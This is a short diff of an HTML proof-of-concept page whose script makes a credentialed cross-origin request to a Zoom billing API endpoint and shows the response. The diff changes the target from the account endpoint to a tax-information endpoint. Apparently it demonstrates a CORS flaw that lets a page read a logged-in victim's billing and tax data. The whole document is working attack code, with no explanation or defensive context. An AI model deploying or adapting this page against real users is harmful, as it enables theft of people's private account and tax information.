@@ -12,7 +12,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };	
- xhr.open("GET","https://on.zoom.us/api/v1/e/billing/account?fetch=false&code=&state=", true);
+ xhr.open("GET","https://on.zoom.us/api/v1/e/billing/tax_info?userType=2", true);
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.withCredentials = true;
 xhr.send();
@@ -20,5 +20,4 @@ xhr.send();
 </script>
 </body>
 </html>
-
 
